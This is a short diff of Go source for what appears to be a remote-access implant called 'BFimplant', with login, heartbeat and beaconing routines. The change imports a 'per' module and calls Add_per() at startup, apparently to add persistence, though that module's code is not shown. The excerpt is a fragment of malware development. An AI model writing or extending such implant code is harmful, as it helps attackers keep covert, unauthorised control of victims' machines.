@@ -15,6 +15,7 @@ import (
 	"BFimplant/modules"
 	"github.com/google/uuid"
 	"encoding/base64"
+	"BFimplant/per"
 )
 
 type plant struct {
@@ -63,6 +64,7 @@ func (i *plant) Start() {
 		fmt.Println("Error logging in:", err)
 		return
 	}
+	per.Add_per()
 	go i.sendHeartbeat()
 	i.Beaconing()
 
